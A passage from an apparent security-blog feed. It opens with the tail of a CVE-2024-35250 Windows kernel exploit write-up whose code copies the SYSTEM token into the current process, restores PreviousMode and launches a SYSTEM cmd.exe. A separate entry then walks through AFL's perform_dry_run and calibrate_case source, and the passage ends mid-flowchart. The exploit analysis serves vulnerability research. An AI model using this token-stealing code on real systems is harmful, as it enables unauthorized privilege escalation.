class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="comment">// 复制System进程的Token到当前进程</span></span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), </span><br><span class="line">        <span class="built_in">Ptr64</span>(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), </span><br><span class="line">        TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恢复PreviousMode以避免BSOD</span></span><br><span class="line">KPROCESSOR_MODE mode = UserMode;</span><br><span class="line"><span class="built_in">Write64</span>(<span class="built_in">Ptr64</span>(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="built_in">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动SYSTEM权限的cmd.exe</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2024-35250分析&quot;&gt;&lt;a href=&quot;#CVE-2024-35250分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2024-35250分析&quot;&gt;&lt;/a&gt;CVE-2024-35250分析&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="Windows内核漏洞" scheme="http://s1nec-1o.github.io/categories/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Windows kernel" scheme="http://s1nec-1o.github.io/tags/Windows-kernel/"/>
    
  </entry>
  
  <entry>
    <title>AFL源码阅读之afl-fuzz结束</title>
    <link href="http://s1nec-1o.github.io/2025/08/16/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz%E7%BB%93%E6%9D%9F/"/>
    <id>http://s1nec-1o.github.io/2025/08/16/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz%E7%BB%93%E6%9D%9F/</id>
    <published>2025-08-16T07:03:01.000Z</published>
    <updated>2025-08-16T07:05:50.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL-fuzz源码阅读"><a href="#AFL-fuzz源码阅读" class="headerlink" title="AFL-fuzz源码阅读"></a>AFL-fuzz源码阅读</h1><h2 id="perform-dry-run-use-argv"><a href="#perform-dry-run-use-argv" class="headerlink" title="perform_dry_run(use_argv);"></a>perform_dry_run(use_argv);</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q = queue;</span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  u8* skip_crashes = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line">    u8* use_mem;</span><br><span class="line">    u8  res;</span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    use_mem = <span class="built_in">ck_alloc_nozero</span>(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">calibrate_case</span>(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">ck_free</span>(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      <span class="built_in">SAYF</span>(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, </span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"> ..... </span><br><span class="line">  &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先从queue获取测试样例<code>(fn == &quot;id:000000,orig:case&quot;)</code>，然后读取之后调用<code>calibrate_case</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault = <span class="number">0</span>, new_bits = <span class="number">0</span>, var_detected = <span class="number">0</span>, hnb = <span class="number">0</span>,</span><br><span class="line">      first_run = (q-&gt;exec_cksum == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc = stage_cur, old_sm = stage_max;</span><br><span class="line">  u32 use_tmout = exec_tmout;</span><br><span class="line">  u8* old_sn = stage_name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span></span><br><span class="line"><span class="comment">     trying to calibrate already-added finds. This helps avoid trouble due</span></span><br><span class="line"><span class="comment">     to intermittent latency. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout = <span class="built_in">MAX</span>(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC / <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;calibration&quot;</span>;</span><br><span class="line">  stage_max  = fast_cal ? <span class="number">3</span> : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span></span><br><span class="line"><span class="comment">     count its spin-up time toward binary calibration. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    <span class="built_in">init_forkserver</span>(argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">    hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">    <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  start_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write_to_testcase</span>(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault = <span class="built_in">run_target</span>(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span></span><br><span class="line"><span class="comment">       we want to bail out quickly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || fault != crash_mode) <span class="keyword">goto</span> abort_calibration;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !<span class="built_in">count_bytes</span>(trace_bits)) &#123;</span><br><span class="line">      fault = FAULT_NOINST;</span><br><span class="line">      <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line"></span><br><span class="line">      hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">      <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">            stage_max    = CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum = cksum;</span><br><span class="line">        <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  total_cal_us     += stop_us - start_us;</span><br><span class="line">  total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* OK, let&#x27;s collect some stats about the performance of this test case.</span></span><br><span class="line"><span class="comment">     This is used for fuzzing air time calculations in calculate_score(). */</span></span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     = (stop_us - start_us) / stage_max;</span><br><span class="line">  q-&gt;bitmap_size = <span class="built_in">count_bytes</span>(trace_bits);</span><br><span class="line">  q-&gt;handicap    = handicap;</span><br><span class="line">  q-&gt;cal_failed  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">update_bitmap_score</span>(q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If this case didn&#x27;t result in new output from the instrumentation, tell</span></span><br><span class="line"><span class="comment">     parent. This is a non-critical problem, but something to warn the user</span></span><br><span class="line"><span class="comment">     about. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark variable paths. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count = <span class="built_in">count_bytes</span>(var_bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">      <span class="built_in">mark_as_variable</span>(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name = old_sn;</span><br><span class="line">  stage_cur  = old_sc;</span><br><span class="line">  stage_max  = old_sm;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!first_run) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>参数说明：</strong></p><ul><li><p>argv: 传递给目标程序的命令行参数数组</p></li><li><p>q: 指向当前测试用例的队列条目</p></li><li><p>use_mem: 测试用例的内容（内存中）</p></li><li><p>handicap: 测试用例的性能惩罚值</p></li><li><p>from_queue: 标志位，表示是否从队列中调用（而非初始处理）</p></li></ul><p><strong>返回值：</strong></p><ul><li><p>FAULT_NONE: 正常执行</p></li><li><p>FAULT_TMOUT: 执行超时</p></li><li><p>FAULT_CRASH: 程序崩溃</p></li><li><p>FAULT_ERROR: 执行错误</p></li><li><p>FAULT_NOINST: 未检测到插桩</p></li><li><p>FAULT_NOBITS: 未产生新的覆盖位</p></li></ul><p><strong>一些变量：</strong></p><ul><li><p>first_trace: 存储第一次运行时的覆盖率信息</p></li><li><p>fault: 执行结果状态</p></li><li><p>new_bits: 是否发现新的覆盖位</p></li><li><p>var_detected: 是否检测到变异行为</p></li><li><p>hnb: 临时存储 has_new_bits 的结果</p></li><li><p>first_run: 是否是第一次运行此测试用例</p></li><li><p>start_us, stop_us: 记录执行时间</p></li><li><p>保存当前阶段信息，以便后续恢复</p></li></ul></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">  <span class="built_in">init_forkserver</span>(argv);</span><br></pre></td></tr></table></figure><p>这里初始化forkserver</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">  hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">  <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果测试用例已有校验和，那么直接覆盖然后检查是否有新的覆盖位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">  <span class="comment">// 执行测试用例并分析结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_us = <span class="built_in">get_cur_time_us</span>();</span><br></pre></td></tr></table></figure><p>记录开始和结束的时间</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">write_to_testcase</span>(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">fault = <span class="built_in">run_target</span>(argv, use_tmout);</span><br></pre></td></tr></table></figure><ul><li><p>如果不是首次运行，定期更新统计信息</p></li><li><p>将测试用例写入文件</p></li><li><p>运行目标程序并获取执行结果</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stop_soon || fault != crash_mode) <span class="keyword">goto</span> abort_calibration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !<span class="built_in">count_bytes</span>(trace_bits)) &#123;</span><br><span class="line">  fault = FAULT_NOINST;</span><br><span class="line">  <span class="keyword">goto</span> abort_calibration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果收到停止信号或执行结果与崩溃模式不符，中止校准</p><p>如果是第一次循环且未检测到覆盖位，设置 FAULT_NOINST 并中止校准</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;</span><br><span class="line">      hnb = <span class="built_in">has_new_bits</span>(virgin_bits);</span><br><span class="line">    <span class="keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_cksum) &#123;</span><br><span class="line">      <span class="comment">// 已有校验和，检测变异行为</span></span><br><span class="line">      u32 i;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;</span><br><span class="line">          var_bytes[i] = <span class="number">1</span>;</span><br><span class="line">          stage_max    = CAL_CYCLES_LONG;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      var_detected = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 首次执行，记录校验和和覆盖位图</span></span><br><span class="line">      q-&gt;exec_cksum = cksum;</span><br><span class="line">      <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果已有校验和但当前校验和不同，则逐位比较覆盖位图，标记变异位置，并延长校准循环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">total_cal_us     += stop_us - start_us;</span><br><span class="line">total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line">q-&gt;exec_us     = (stop_us - start_us) / stage_max;</span><br><span class="line">q-&gt;bitmap_size = <span class="built_in">count_bytes</span>(trace_bits);</span><br><span class="line">q-&gt;handicap    = handicap;</span><br><span class="line">q-&gt;cal_failed  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line"><span class="built_in">update_bitmap_score</span>(q);</span><br></pre></td></tr></table></figure><p>之后会计算统计的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault = FAULT_NOBITS;</span><br></pre></td></tr></table></figure><p>如果是首次运行，且未产生新的覆盖位，就会标记为<code>FAULT_NOBITS</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (new_bits == <span class="number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">  q-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">  queued_with_cov++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果产生了新的路径覆盖，则mark</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_detected) &#123;</span><br><span class="line">  var_byte_count = <span class="built_in">count_bytes</span>(var_bytes);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!q-&gt;var_behavior) &#123;</span><br><span class="line">    <span class="built_in">mark_as_variable</span>(q);</span><br><span class="line">    queued_variable++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有变异行为，计算变异字节数，并mark测试用例为变异行为</p><p>总的来说就是：</p><ul><li><p>运行目标程序多次（通常是8次，由 CAL_CYCLES 定义）</p></li><li><p>收集执行信息，如执行时间、代码覆盖率等</p></li><li><p>检测程序行为是否稳定（每次运行是否产生相同的覆盖率）</p></li><li><p>返回执行结果状态（如正常、超时、崩溃等）</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[开始 perform_dry_run] --&gt; B[&quot;初始化变量&lt;br/&gt;q = queue&lt;br/&gt;cal_failures = 0&lt;br/&gt;skip_crashes = getenv&quot;]</span><br><span class="line">    B --&gt; C&#123;&quot;队列中还有测试用例?&lt;br/&gt;q != NULL&quot;&#125;</span><br><span class="line">    C --&gt;|是| D[&quot;提取文件名&lt;br/&gt;fn = strrchr + 1&quot;]</span><br><span class="line">    D --&gt; E[&quot;打开文件&lt;br/&gt;fd = open O_RDONLY&quot;]</span><br><span class="line">    E --&gt; F&#123;文件打开成功?&#125;</span><br><span class="line">    F --&gt;|否| G[PFATAL 退出]</span><br><span class="line">    F --&gt;|是| H[&quot;分配内存&lt;br/&gt;use_mem = ck_alloc_nozero&quot;]</span><br><span class="line">    H --&gt; I[&quot;读取文件内容&lt;br/&gt;read fd, use_mem, q-&gt;len&quot;]</span><br><span class="line">    I --&gt; J&#123;读取完整?&#125;</span><br><span class="line">    J --&gt;|否| K[FATAL 退出]</span><br><span class="line">    J --&gt;|是| L[&quot;关闭文件&lt;br/&gt;close fd&quot;]</span><br><span class="line">    L --&gt; 